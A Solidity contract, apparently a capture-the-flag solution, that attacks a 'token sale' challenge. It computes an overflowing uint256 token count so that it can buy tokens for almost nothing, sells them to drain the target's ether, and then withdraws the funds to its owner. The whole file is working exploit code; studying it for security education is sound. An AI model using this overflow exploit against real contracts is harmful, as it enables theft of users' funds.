//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;
import "hardhat/console.sol";

interface ITokenSaleChallenge {
    function isComplete() external view returns (bool);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleAttacker {
    address immutable owner;
    uint256 constant PRICE = 1 ether;

    constructor() {
        owner = msg.sender;
    }

    function exploit(address target) external payable {
        (uint256 value, uint256 numTokens) = valueToSend();
        require(msg.value == value);

        ITokenSaleChallenge(payable(target)).buy{value: msg.value}(numTokens);
        uint256 sellAmount = address(target).balance / PRICE;
        ITokenSaleChallenge(target).sell(sellAmount);
    }

    receive() external payable {}

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }

    function valueToSend() public pure returns (uint256, uint256) {
        uint256 amount = type(uint256).max / PRICE;
        uint256 numTokens = amount + 1;
        uint256 value;
        unchecked {
            value = numTokens * PRICE;
        }
        return (value, numTokens);
    }
}
